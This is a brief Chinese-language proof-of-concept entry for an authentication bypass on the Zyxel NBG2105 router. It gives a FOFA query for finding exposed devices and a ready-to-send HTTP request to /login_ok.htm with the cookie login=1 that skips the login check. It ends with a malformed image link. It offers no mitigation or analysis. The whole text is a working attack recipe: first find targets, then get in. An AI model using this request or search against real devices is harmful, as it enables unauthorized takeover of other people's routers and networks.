# Zyxel NBG2105 身份验证绕过

## 资产搜索：

fofa app="ZyXEL-NBG2105"

## POC：
访问`url/login_ok.htm` cookie设置为`login=1`
```shell
GET /login_ok.htm HTTP/1.1
cookie:login=1
```
!()[img/passlogin.jpg]